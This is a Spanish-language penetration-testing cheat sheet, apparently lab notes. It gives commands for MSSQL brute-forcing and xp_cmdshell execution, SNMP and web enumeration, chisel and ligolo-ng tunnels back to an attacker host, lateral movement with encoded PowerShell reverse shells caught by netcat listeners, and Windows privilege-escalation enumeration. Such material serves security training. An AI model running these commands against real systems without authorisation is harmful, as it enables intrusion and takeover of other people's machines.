- ms-sql-brute    
- ms-sql-empty-password    
- ms-sql-query    
- ms-sql-dump-hashes    
- ms-sql-xp-cmdshell

```bash
sudo nmap --script ms-sql-info -p 1433 <RHOST>

# Comprobar autenticación NTLM
sudo nmap --script ms-sql-ntlm-info --script-args mssql.instance-port 1433 <RHOST>

# Enumerar usuarios y contraseña validos para MSSQL
sudo nmap -p 1433 --script ms-sql-brute -script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <RHOST>

# Comprobar si el usuario "sa" tiene configurada la contraseña como vacía
sudo nmap -p 1433 --script ms-sql-empty-password <RHOST>

# Extraer todos los usuarios con sesión con una consulta sql
sudo nmap -p 1433 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-query="SELECT * FROM master..syslogins" <RHOST> -oN output.txt

# Ejecutar un comando en la máquina victima usando xp_cmdshell
sudo nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" <RHOST>
```

####  4.4.2. <a name='netexec-2'></a>Netexec

```bash
# Realiza una consulta SQL
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -q <SQL_QUERY>

# Ejecuta un comando en el sistema Windows si la opción `xp_cmdshell` esta habilitada para el usuario
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -x <COMMAND>

# Enumera los privilegios para escalar de un usuario estandar a sysadmin
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv

# Aproveche los privilegios de MSSQL para escalar de un usuario estándar a un sysadmin.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=privesc

# Revertir los privilegios del usuario al usuario estándar.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=rollback

# Obtener un archivo remoto de una carpeta compartida.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --get-file <REMOTE_FILENAME> <OUTPUT_FILENAME>

# Subir un archivo local en una ubicación remota
nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --put-file <LOCAL_FILENAME> <REMOTE_FILENAME>
```
####  4.4.3. <a name='conexión'></a>Conexión

```powershell
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

```bash
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```bash
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN
```
####  4.4.4. <a name='comandos-básicos-1'></a>Comandos básicos

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```
####  4.4.5. <a name='mostrar-el-contenido-de-una-base-de-datos'></a>Mostrar el contenido de una base de datos

```sql
1> SELECT name FROM master.sys.databases
2> go
```

####  4.4.6. <a name='ejecución-de-código'></a>Ejecución de código

En MSSQL gracias a la palabra clave `execute`, podemos ejecutar el comando arbitrario en el sistema operativo. Para hacer eso primero tenemos que habilitar la ejecución del comando dentro de la base de datos de la siguiente forma:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

De esta forma, ya podemos ejecutar comandos:

```sql
EXECUTE xp_cmdshell 'whoami'
```
###  4.5. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)

El Protocolo Simple de Administración de Red, o SNMP por sus siglas en inglés, es un protocolo basado en UDP que, inicialmente, fue implementado de manera no muy segura. Cuenta con una base de datos (MIB) que almacena información relacionada con la red. El puerto predeterminado de SNMP es el 161 UDP. Hasta la tercera versión de este protocolo, SNMPv3, la seguridad de SNMP era deficiente. Existen diversas herramientas para interactuar con SNMP, ya que este protocolo puede proporcionarnos mucha información acerca de una organización, basándose en las respuestas del servidor. Algunas herramientas útiles incluyen _onesixtyone_ para realizar ataques de fuerza bruta básicos y enumeración, y _snmpwalk_ para acceder a los datos de la base de datos MIB.

La "cadena de comunidad SNMP" funciona como un ID de usuario o una contraseña que permite acceder a las estadísticas de un enrutador u otro dispositivo. Las cadenas de comunidad SNMP solo se utilizan en dispositivos que soportan los protocolos SNMPv1 y SNMPv2c. Por su parte, SNMPv3 utiliza autenticación mediante nombre de usuario/contraseña, junto con una clave de cifrado. De manera convencional, la mayoría de los dispositivos SNMPv1 y SNMPv2c que se envían de fábrica tienen la cadena de comunidad de solo lectura configurada como "public". Es una práctica estándar que los administradores de red cambien todas las cadenas de comunidad a valores personalizados durante la configuración del dispositivo.

```bash
sudo apt-get install snmp-mibs-downloader
```

```bash
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

| MIB                    | Microsoft Windows SNMP parámetros |
| ---------------------- | --------------------------------- |
| 1.3.6.1.2.1.25.1.6.0   | Procesos                          |
| 1.3.6.1.2.1.25.4.2.1.2 | Programas en ejecución            |
| 1.3.6.1.2.1.25.4.2.1.4 | Rutas de los procesos             |
| 1.3.6.1.2.1.25.2.3.1.4 | Unidades de almacenamiento        |
| 1.3.6.1.2.1.25.6.3.1.2 | Software                          |
| 1.3.6.1.4.1.77.1.2.25  | Cuentas de usuarios               |
| 1.3.6.1.2.1.6.13.1.3   | Puertos TCP locales               |

Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)

###  4.6. <a name='rdp-(3389)'></a>RDP (3389)

El protocolo RDP (Remote Desktop Protocol) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse de manera remota a una computadora con Windows. Utiliza el puerto 3389 por defecto y permite que los usuarios controlen una máquina a distancia, viendo su escritorio y utilizando aplicaciones como si estuvieran frente a ella. Es ampliamente utilizado para administración remota y soporte técnico.

####  4.6.1. <a name='xfreerdp'></a>xfreerdp

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
rdesktop <RHOST>
```
###  4.7. <a name='netexec-3'></a>Netexec

```bash
# Si NLA está deshabilitado, le permitirá tomar una captura de pantalla del mensaje de inicio de sesión
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --nla-screenshot

# Toma una captura de pantall del objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screenshot

# Enumerar los permisos en todos los recursos compartidos del objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screentime <SCREENTIME>

# Enumerar las sesiones activas en el objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --res <RESOLUTION>
```
##  5. <a name='web'></a>Web

###  5.1. <a name='enumeración'></a>Enumeración

####  5.1.1. <a name='fuff'></a>Fuff

```bash
# Fuzzing de directorios y archivos
ffuf -c -u http://<RHOST>/FUZZ -w <WORDLIST> -t 20
ffuf -c -u http://<RHOST>/FUZZ -mc all --fs <NUMBER> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -c -u http://<RHOST>/FUZZ -mc all --fw <NUMBER> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -c -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -w /usr/share/wordlists/dirb/common.txt -o ffuf_scan.txt
ffuf -c -u http://<RHOST>/FUZZ -recursion -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html,.cgi,.bkp,.zip

# Fuzzing a través de proxychains
ffuf -c -recursion-depth 2 -x socks5://localhost:4444 -u http://<RHOST>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php

# Fuzzing de subdominios
ffuf -c -u http://<RHOST>/FUZZ -H 'Host: FUZZ.<RHOST>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs <NUMBER>

# LFI
ffuf -c -fs <NUMBER> -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Fuzzing con PHP Session ID
ffuf -c -fw 2644 -u "http://<RHOST>/admin/FUZZ.php" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp"

# API
ffuf -c -ac -t 250 -fc 400,404,412 -u https://<RHOST>/api/v1/FUZZ -w api_seen_in_wild.txt 
```

####  5.1.2. <a name='gobuster'></a>Gobuster

```bash
gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<RHOST>/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php
gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js -e -s 200
gobuster dir -u https://<RHOST>:<RPORT>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 200 -k --wildcard

# VHost Discovery
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Parámetros:

- `-e` Modo extendido que muestra la URL completa
- `-k` Ingnora la validación del certificado SSL
- `-r` Redirecciones
- `-s` Código de estado
- `-b` Excluye códigos de estado
- `--wildcard` Establecer la opción comodín

####  5.1.3. <a name='wfuzz'></a>Wfuzz

```bash
# Fuzzing de directorio
wfuzz -c -u http://<RHOST>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 403,404

# Fuzzing de archivos
wfuzz -c -u http://<RHOST>/FUZZ/<FILE>.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 403,404 -f <FILE>

# Fuzzing de dos parámetros
wfuzz -c -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -z list,txt-php --hc 403,404

# Subdominios
wfuzz <RHOST> -H "Host: FUZZ.<RHOST>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 200 --hw 356 -t 100

# Login
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt--hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --ss "Username or Password Invalid"
```

###  5.2. <a name='enumeración-de-cms'></a>Enumeración de CMS

####  5.2.1. <a name='wordpress'></a>Wordpress
##### WPScan

Enumeración de temas y plugins Wordpress

```bash
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
wpscan --url http://<RHOST>/wordpress --api-token $WP_TOKEN --plugins-detection aggressive
```

> La variable de entorno `$WP_TOKEN` contiene el token generado en la web [https://wpscan.com/](https://wpscan.com/)

##### Nuclei

```bash
nuclei -u http://<RHOST>/wordpress/ -tags fuzz -t /home/d4redevil/.local/nuclei-templates/http/fuzzing/wordpress-plugins-detect.yaml
```
##### Gobuster

```bash
gobuster dir -u http://<RHOST>/wordpress/ -w /usr/share/seclists/Discovery/WebContent/CMS/wp-plugins.fuzz.txt
```

####  5.2.2. <a name='joomla'></a>Joomla

```bash
joomscan -u http://<RHOST>
```

####  5.2.3. <a name='drupal'></a>Drupal

```bash
droopescan scan drupal -u http://<RHOST> -t 32
```

####  5.2.4. <a name='magento'></a>Magento

```bash
php magescan.phar scan:all http://<RHOST>
```

##  6. <a name='pivoting'></a>Pivoting

###  6.1. <a name='chisel'></a>Chisel
####  6.1.1. <a name='servidor-(atacante)'></a>Servidor (Atacante)

```bash
chisel server -p 8000 --reverse --socks5
```
####  6.1.2. <a name='cliente-(víctima)'></a>Cliente (Víctima)

Linux

```bash
./chisel client <IP-CHISEL-SERVER>:8000 R:8000:socks
./chisel client <IP-CHISEL-SERVER>:8000 R:3000:127.0.0.1:3000
```

Windows

```powershell
.\chisel.exe client <ipKali>:8000 R:4444:socks 9001:127.0.0.1:9001 8888:127.0.0.1:80
```

- Proxy socks en puerto Kali 4444
- Mapea 9001 MS01 a 9001 Kali
- Mapea 8888 MS01 a 80 Kali
####  6.1.3. <a name='socat'></a>Socat

```bash
./socat tcp-listen:2222,fork,reuseaddr tcp:10.10.10.5:8000 &
```

Exponer un puerto local

```bash
socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
```

> En este caso, el puerto `8080` no esta expuesto fuera del equipo local, pero con el comando anterior exponemos el puerto hacia fuera a través del puerto `8282`.

###  6.2. <a name='ligolo-ng'></a>Ligolo-ng

####  6.2.1. <a name='descargar-el-proxy-y-el-agente'></a>Descargar el Proxy y el Agente

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.7.5_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.7.5_Linux_64bit.tar.gz
```

####  6.2.2. <a name='preparar-las-interfaces-para-el-tunel'></a>Preparar las interfaces para el tunel

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

####  6.2.3. <a name='configurar-proxy-en-la-máquina-del-atacante'></a>Configurar proxy en la máquina del atacante

```bash
./proxy -laddr <LHOST>:443 -selfcert
```

####  6.2.4. <a name='configurar-el-agente-en-la-máquina-víctima'></a>Configurar el agente en la máquina víctima

```bash
./agent -connect <LHOST>:443 -ignore-cert
```

####  6.2.5. <a name='configurar-la-sesión'></a>Configurar la sesión

```bash
ligolo-ng » session
[Agent : user@target] » ifconfig
sudo ip r add 172.16.1.0/24 dev ligolo
[Agent : user@target] » start
```
##### Port Forwarding

```bash
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

##  7. <a name='passwords-attacks'></a>Passwords Attacks

##  8. <a name='transferencia-de-archivos'></a>Transferencia de Archivos

###  8.1. <a name='windows-1'></a>Windows

Diferentes utilidades para las operaciones de transferencia de archivos en Windows.
###  8.2. <a name='linux-1'></a>Linux

Diferentes utilidades para las operaciones de transferencia de archivos en Linux.

##  9. <a name='movimiento-lateral'></a>Movimiento Lateral

###  9.1. <a name='rdp'></a>RDP

####  9.1.1. <a name='xfreerdp-1'></a>xfreerdp

```bash
xfreerdp /u:'<USER>' /p:'<PASSWORD>' /d:hacklab.local /v:192.168.56.10 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

Parámetros:

- `/bpp:8`: Reduce la profundidad del color a 8 bits por píxel, disminuyendo la cantidad de datos transmitidos.
- `/compression`: Habilita la compresión para reducir la cantidad de datos enviados a través de la red.
- `-themes`: Desactiva los temas del escritorio para reducir los datos gráficos.
- `-wallpaper`: Desactiva el fondo de pantalla del escritorio para reducir aún más los datos gráficos.
- `/clipboard`: permite compartir el portapapeles entre las máquinas locales y remotas.
- `/audio-mode:0`: Desactiva la redirección de audio para ahorrar ancho de banda.
- `/auto-reconnect`: Se vuelve a conectar automáticamente si la conexión se interrumpe, lo que mejora la estabilidad de la sesión.
- `-glyph-cache`: permite el almacenamiento en caché de glifos (caracteres de texto) para reducir la cantidad de datos enviados para la representación de texto.

###  9.2. <a name='smb'></a>SMB

####  9.2.1. <a name='psexec'></a>PsExec

[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) está incluido en el conjunto de herramientas Sysinternals de Microsoft, una colección de herramientas diseñadas para ayudar a los administradores en tareas de gestión del sistema. Esta herramienta facilita la ejecución remota de comandos y recupera la salida a través de un pipe con nombre utilizando el protocolo SMB, operando en el puerto TCP 445 y el puerto TCP 139.

```powershell
.\PsExec.exe \\MS02 -i -u HACKLAB.LOCAL\elliot -p Password123 cmd
```
####  9.2.2. <a name='sharpnopsexec'></a>SharpNoPSExec

[SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) es una herramienta diseñada para facilitar el movimiento lateral aprovechando los servicios existentes en un sistema de destino sin crear otros nuevos ni escribir en el disco, minimizando así el riesgo de detección. La herramienta consulta todos los servicios en la máquina de destino, identificando aquellos con un tipo de inicio configurado como deshabilitado o manual, estado actual de detenido y ejecutándose con privilegios de LocalSystem. Selecciona aleatoriamente uno de estos servicios y modifica temporalmente su ruta binaria para apuntar a una carga útil elegida por el atacante. Tras la ejecución, `SharpNoPSExec` espera aproximadamente 5 segundos antes de restaurar la configuración original del servicio, devolviendo el servicio a su estado anterior. Este enfoque no solo proporciona un shell, sino que también evita la creación de nuevos servicios, lo que podría ser detectado por los sistemas de monitoreo de seguridad.

Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

Ejecutamos `SharpNoPSExec`

```powershell
.\SharpNoPSExec.exe --target=192.168.56.10 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="
```

> Creamos un shell en [revshells.com](https://www.revshells.com/)

####  9.2.3. <a name='nimexec'></a>NimExec

[NimExec](https://github.com/frkngksl/NimExec) es una herramienta de ejecución remota de comandos sin archivos que utiliza el Protocolo de Control de Servicios Remotos (MS-SCMR). Manipula la ruta binaria de un servicio con privilegios de LocalSystem para ejecutar comandos en la máquina objetivo y luego restaura la configuración original. Funciona enviando paquetes RPC personalizados a través de SMB y el pipe svcctl, autenticándose mediante un hash NTLM. Al evitar funciones específicas del sistema operativo y aprovechar la compilación cruzada de Nim, NimExec es compatible con múltiples sistemas operativos, ofreciendo una solución versátil y eficiente.

Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

Ejecutamos NimExec

```powershell
.\NimExec -u <user> -d hacklab.local -p <password> -t 192.168.56.10 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
```

####  9.2.4. <a name='psexec.py'></a>psexec.py

```bash
impacket-psexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
```

####  9.2.5. <a name='smbexec.py'></a>smbexec.py

```bash
impacket-smbexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
```

####  9.2.6. <a name='atexec.py'></a>atexec.py

El [script atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py) utiliza el servicio Programador de tareas de Windows, al que se puede acceder a través de la tubería SMB `atsvc`. Nos permite agregar de forma remota una tarea al programador, que se ejecutará en el momento designado.

Con esta herramienta, la salida del comando se envía a un archivo, al que posteriormente se accede a través del recurso compartido `ADMIN$`. Para que esta utilidad sea efectiva, es esencial sincronizar los relojes de la computadora atacante y de la computadora objetivo al minuto exacto.

Podemos aprovechar esta herramienta insertando un reverse shell en el host de destino.

Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

Ahora pasemos el nombre de dominio, el usuario administrador, la contraseña y la dirección IP de destino. `<domain>/<user>:<password>@<ip>`y, por último, podemos pasar nuestro payload de reverse shell para que se ejecute.

```bash
impacket-atexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
```

###  9.3. <a name='winrm'></a>WinRM

[Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) es la versión de Microsoft del [protocolo WS-Management (Web Services-Management)](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) , un protocolo estándar para administrar software y hardware de forma remota. WinRM facilita la transferencia de datos de administración entre computadoras, lo que permite a los administradores realizar una variedad de tareas, como ejecutar scripts y recuperar datos de eventos de sistemas remotos.

WinRM se usa comúnmente junto con PowerShell con fines administrativos y de automatización, lo que lo convierte en una herramienta indispensable para administrar entornos Windows. Proporciona un método seguro y eficiente para interactuar con sistemas remotos, aprovechando los estándares web establecidos para garantizar la compatibilidad y la flexibilidad. La comunicación WinRM utiliza principalmente el puerto TCP `5985` para HTTP y `5986` para HTTPS.

```bash
netexec winrm 192.168.56.10 -u <user> -p <password>
```
####  9.3.1. <a name='invoke-command'></a>Invoke-Command
Podemos usar PowerShell para interactuar con WinRM en Windows, PowerShell tiene cmdlets como [Invoke-Command](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4) y [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4) para administrar y ejecutar comandos en sistemas remotos.

```powershell
 Invoke-Command -ComputerName MS02 -ScriptBlock { hostname;whoami }
```

Además, podemos especificar credenciales con el parámetro `-Credential`:

```powershell
PS C:\Tools> $username = "HACKLAB.LOCAL\elliot"
PS C:\Tools> $password = "Password123"
PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools> Invoke-Command -ComputerName 192.168.56.10 -Credential $credential -ScriptBlock { whoami; hostname }
hacklab.local\elliot
DC01
```

> Si usamos la IP en lugar del nombre de la computadora, debemos usar credenciales explícitas o, alternativamente, podemos usar la bandera `-Authentication Negotiate` en lugar de proporcionar credenciales explícitas.

####  9.3.2. <a name='winrs'></a>WINRS

[winrs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell) es una herramienta de línea de comandos que permite ejecutar comandos en una máquina con Windows utilizando WinRM de forma remota. A continuación se muestra un ejemplo de cómo utilizar `winrs` para ejecutar un comando en un servidor remoto:

```powershell-session
PS C:\Tools> winrs -r:MS02 "powershell -c whoami;hostname"
hacklab.local\elliot
DC01
```

`winrs` también nos permite usar credenciales explícitas con las opciones `/username:<username>` y `/password:<password>` así:

```powershell
PS C:\Tools> winrs /remote:MS02 /username:elliot /password:Password123 "powershell -c whoami;hostname"
hacklab.local\elliot
DC01
```

####  9.3.3. <a name='enter-pssession'></a>Enter-PSSession

Podemos usar el Cmdlet `Enter-PSSession` para un shell interactivo usando PowerShell Remoting. Este cmdlet nos permite iniciar una sesión interactiva con la computadora remota, ya sea utilizando una sesión creada con `New-PSSession`, especificando credenciales explícitas, o aprovechando la sesión actual donde se ejecuta el comando. Por ejemplo, reutilicemos el `$sessionMS02` variable que creamos anteriormente. Especificando el `Enter-PSSession` y la variable nos dará un mensaje interactivo de PowerShell en la computadora remota, lo que nos permite ejecutar comandos como si nos registraran directamente.

```powershell
PS C:\Temp> $username = "HACKLAB.LOCAL\elliot"
PS C:\Temp> $password = "Password123"
PS C:\Temp> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Temp> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Temp> $sessionMS02 = New-PSSession -ComputerName MS02 -Credential $credential
PS C:\Temp> Enter-PSSession $sessionMS02
[MS02]: PS C:\Users\elliot\Documents>
```

####  9.3.4. <a name='netexec-4'></a>NetExec

Con `NetExec` podemos usar la opción `-x` para ejecutar comandos CMD o PowerShell. Por ejemplo, para ejecutar un comando básico como `ipconfig` podemos usar el siguiente comando:

```shell
netexec winrm 192.168.56.10 -u elliot -p Password123 -x "ipconfig"
```

####  9.3.5. <a name='evil-winrm'></a>Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) es una herramienta basada en Ruby que facilita la interacción con WinRM desde Linux. Ofrece una interfaz sencilla para ejecutar comandos y administrar sistemas Windows de forma remota.

Una vez instalado, podemos usar `evil-winrm` para conectarse a una máquina Windows remota y ejecutar comandos. Debemos especificar la opción. `-i <target>` y las credenciales con las opciones `-u '<domain>\<user>'` para usuarios y para contraseña `-p <password>`:

```bash
evil-winrm -i 192.168.56.10 -u elliot -p Password123
```

##  10. <a name='escalación-de-privilegios'></a>Escalación de Privilegios

###  10.1. <a name='windows-2'></a>Windows

####  10.1.1. <a name='enumeración-1'></a>Enumeración

##### Sistema

```powershell
hostname

# Devuelve True si un equipo forma parte de un dominio
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

qwinsta

query user

systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
[System.Environment]::OSVersion.Version
Get-ComputerInfo
Get-ComputerInfo | Select OsName,OsVersion,OsType

# variable de entorno
echo %PATH%
set
Get-ChildItem Env: | ft Key,Value

# Parches
wmic qfe get Caption, Description, HotFixID, InstalledOn
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

# Actualizaciones del sistema
wmic qfe list brief

# Lista los procesos en ejecución
tasklist /svc

# Lista los procesos en ejecución
Get-Process
Get-Process | Select-Object Name, Path
Get-WmiObject Win32_Process -Filter "name = 'notepad.exe'" | Select-Object Name, ExecutablePath

# Listar procesos NO estandar, procesos que no están en las carpetas del sistema
Get-Process | Where-Object { $_.Path -notmatch "C:\\Windows\\System32" -and $_.Path -notmatch "C:\\Windows\\SysWOW64" } | Select-Object ProcessName, Id, Path

# Parches
Get-HotFix | ft -AutoSize

# Programas instalados
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-WmiObject -Class Win32_Product |  select Name, Version
wmic product get name

# Lista los modulos
Get-Module

Get-ExecutionPolicy -List

# Listar las reglas de AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Probar la política de AppLocker
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

# Obtener el historial de PowerShell del usuario especificado
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Confirmar si UAC esta habilitado
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Comprobar el nivel de UAC
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

##### Usuarios

```powershell
whoami all
whoami /priv
whoami /groups

# Usuarios Locales
net users
net user <USER>
net user <USER> /domain
net user %username%
Get-LocalUser

# Información acerca del requerimiento de contraseña
net accounts
net accounts /domain

# Crear usuario
net user /add <USERNAME> <PASSWORD>

echo "%USERDOMAIN%"
echo %logonserver%
wmic USERACCOUNT Get Domain,Name,Sid
```

##### Grupos

```powershell
# Local
net localgroup # Lista todos los grupos
net localgroup Administrators # Info acerca de un grupo (admins)
net localgroup administrators <USERNAME> /add # Agreaga un usuario al grupo administrators

Get-LocalGroup # Lista todos los grupos locales
Get-LocalGroupMember <GROUP> # Lista los miembros de un Grupo

# Dominio
net group /domain                      # Info acerca de los grupos del dominio
net group /domain <DOMAIN_GROUP_NAME>  # Usuarios que pertencen al grupo
net group "Domain Computers" /domain   # Lista de PC conectadas al dominio
net group "Domain Controllers" /domain # Listar cuentas de PC de controladores de dominio
```
##### Red

```powershell
ifconfig
ifconfig /all
route print
arp -a
netstat -ano
netsh advfirewall show state
```
##### Windows Defender

```powershell
netsh advfirewall show allprofiles
sc query windefend

Get-MpComputerStatus
```
##### Recursos compartidos

Recursos compartidos comunes en Windows:

- `C$` corresponde a C:/
- `ADMIN$` se asigna a C:/Windows
- `IPC$` se utiliza para RPC
- `Print$` aloja controladores para impresoras compartidas
- `SYSVOL` sólo en DCs
- `NETLOGON` sólo en los DC

```powershell
# Listar recursos compartidos
Get-SMBShare
net share

# Montar el recurso compartido
net use z: \\172.16.0.1\C$ /user:elliot "P@ssword123!"

# Desmontar el recurso compartido
net use /delete z:

# /all nos permite ver los recursos compartidos administrativos (que terminan en '$').
# Puede usarse IP o nombre de host para especificar el host.
net view \\172.16.0.1 /all
